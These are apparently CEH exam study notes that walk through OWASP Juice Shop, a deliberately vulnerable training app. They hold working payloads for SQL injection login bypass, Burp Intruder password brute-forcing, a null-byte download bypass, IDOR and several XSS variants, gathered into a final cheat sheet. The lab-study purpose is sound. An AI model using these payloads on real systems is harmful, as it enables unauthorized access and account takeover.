# 🧠 OWASP Juice Shop – CEH Practical Notes

---

## 🔰 Overview

**Target:** OWASP Juice Shop (vulnerable web app)  
**Goal:** Identify & exploit OWASP Top 10 vulnerabilities

### 🔥 Covered Vulnerabilities

- Injection (SQLi)
    
- Broken Authentication
    
- Sensitive Data Exposure
    
- Broken Access Control
    
- Cross-Site Scripting (XSS)
    

---

## 🧭 Recon (Walking Through Application)

### 🔍 Steps

1. Turn **Burp Intercept OFF**
    
2. Browse the entire application
    
3. Capture requests in **HTTP History**
    

### 🎯 Key Findings

- Admin Email → `admin@juice-sh.op`
    
- Search Parameter → `q`
    

---

### 🧩 Diagram: Recon Flow

```
User → Browser → Burp (Intercept OFF) → Server
                          ↓
                  HTTP History Logs
```

---

## 💉 Injection (SQL Injection)

### 🧠 Concept

SQL Injection manipulates database queries

---

### 🔑 Admin Login Bypass

#### Payload:

```sql
' OR 1=1--
```

#### Steps:

1. Capture login request in Burp
    
2. Modify email field:
    

```
' OR 1=1--
```

3. Forward request
    

---

### 🔓 Why It Works

```
Original Query:
SELECT * FROM users WHERE email='input' AND password='input';

Injected Query:
SELECT * FROM users WHERE email='' OR 1=1--' AND password='input';
```

✔ `1=1` → Always TRUE  
✔ `--` → Comments out rest

---

### 👤 Bender Login

#### Payload:

```sql
bender@juice-sh.op'--
```

✔ Valid email → no need for `1=1`

---

### 🧩 Diagram: SQLi Logic

```
User Input → SQL Query → Manipulated Query → Auth Bypass
```

---

## 🔐 Broken Authentication

---

### ⚡ Bruteforce Admin Password

#### Tool: Burp Intruder

#### Steps:

1. Capture login request
    
2. Send to **Intruder**
    
3. Set payload position:
    

```
"password":"§§"
```

4. Load wordlist:
    

```bash
apt-get install seclists
```

📂 Path:

```
/usr/share/wordlists/SecLists/Passwords/Common-Credentials/best1050.txt
```

---

### 🎯 Filter Responses

- ❌ 401 → Failed
    
- ✅ 200 → Success
    

---

### 🔄 Password Reset Exploit

#### Target: Jim

- Security Question: _Eldest sibling middle name_
    
- Answer: `Samuel`
    

✔ Reset password successfully

---

### 🧩 Diagram: Bruteforce Flow

```
Wordlist → Intruder → Requests → Response Filter → Password Found
```

---

## 🔓 Sensitive Data Exposure

---

### 📂 Exposed Directory

#### URL:

```
http://<IP>/ftp/
```

---

### 📥 Files Found:

- `acquisitions.md`
    
- `package.json.bak`
    

---

### 🚨 Download Restricted File (Bypass)

#### Problem:

403 → only `.md` or `.pdf`

#### Solution: **Poison Null Byte**

```bash
%2500
```

#### Payload:

```
package.json.bak%2500.md
```

---

### 🧠 Why It Works

- `%00` → NULL terminator
    
- Server stops reading after `.bak`
    

---

### 🔑 MC SafeSearch Login

Password clue → vowels replaced with `0`

✔ Password:

```
Mr. N00dles
```

---

### 🧩 Diagram: Null Byte Attack

```
Input → Server → Stops at %00 → Bypass Validation
```

---

## 🛡️ Broken Access Control

---

### 🧭 Admin Page Discovery

#### Steps:

1. Open DevTools → Debugger
    
2. Open:
    

```
main-es2015.js
```

3. Search:
    

```
admin
```

✔ Found:

```
/#/administration
```

---

### 🛒 Access Other User Basket

#### Request:

```
GET /rest/basket/1
```

#### Modify:

```
GET /rest/basket/2
```

✔ IDOR (Insecure Direct Object Reference)

---

### ⭐ Delete Reviews

- Go to:
    

```
/#/administration
```

- Delete 5-star reviews
    

---

### 🧩 Diagram: IDOR Attack

```
UserID=1 → Change → UserID=2 → Unauthorized Access
```

---

## ⚡ Cross-Site Scripting (XSS)

---

## 🧨 1. DOM XSS

#### Payload:

```html
<iframe src="javascript:alert(`xss`)">
```

#### Injection Point:

- Search bar
    

---

## 💾 2. Persistent XSS

#### Steps:

1. Enable Burp Intercept
    
2. Logout request → Modify header
    

#### Add Header:

```
True-Client-IP: <iframe src="javascript:alert(`xss`)">
```

3. Login again → Visit "Last Login IP"
    

✔ Payload executes

---

## 🔁 3. Reflected XSS

#### Steps:

1. Go to Order History → Track order
    
2. Replace ID with:
    

```html
<iframe src="javascript:alert(`xss`)">
```

---

### 🧠 Why XSS Works

- No input sanitization
    
- JS executed in browser
    

---

### 🧩 Diagram: XSS Flow

```
User Input → Server Response → Browser Executes JS
```

---

## 🏁 Scoreboard

#### URL:

```
/#/score-board/
```

✔ Shows completed & pending challenges

---

# ⚡ Final Revision Cheat Sheet

---

## 🔥 Important Payloads

### SQLi

```sql
' OR 1=1--
email'--
```

### XSS

```html
<iframe src="javascript:alert(`xss`)">
```

### Null Byte

```
%2500
```

---

## ⚙️ Important Commands

```bash
apt-get install seclists
```

---

## 🧠 Key Concepts

|Vulnerability|Trick|
|---|---|
|SQLi|`' OR 1=1--`|
|Bruteforce|Burp Intruder|
|Data Exposure|/ftp/|
|Access Control|Change ID|
|XSS|Inject JS|

---

## 🚀 Exam Strategy

1. **Recon first (Burp OFF)**
    
2. **Capture requests**
    
3. **Test inputs (SQLi/XSS)**
    
4. **Check hidden endpoints (JS files)**
    
5. **Modify IDs (IDOR)**
    
6. **Look for exposed directories**
    
7. **Use Intruder for brute force**
    

---

